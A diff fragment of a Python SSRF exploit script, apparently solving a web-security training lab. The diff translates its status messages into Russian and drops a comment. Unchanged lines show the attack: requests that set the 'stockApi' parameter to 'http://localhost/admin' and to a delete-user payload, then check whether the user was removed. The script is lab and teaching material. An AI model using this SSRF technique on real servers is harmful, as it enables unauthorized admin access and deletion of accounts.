@@ -11,14 +11,13 @@ def delete_user(url):
     params = {'stockApi': delete_user_url_ssrf_payload}
     r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
 
-    # Check if user was deleted
     admin_ssrf_payload = 'http://localhost/admin'
     params2 = {'stockApi': admin_ssrf_payload}
     r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
     if 'User deleted successfully' in r.text:
-        print("(+) Successfully deleted Carlos user!")
+        print("(+) Успешное удаление пользователя")
     else:
-        print("(-) Exploit was unsuccessful.")
+        print("(-) Атака была заверешна неудачей")
 
 def main():
     if len(sys.argv) != 2:
@@ -27,7 +26,7 @@ def main():
         sys.exit(-1)
 
     url = sys.argv[1]
-    print("(+) Deleting Carlos user...")
+    print("(+) Удаление пользователя...")
     delete_user(url)
 
 
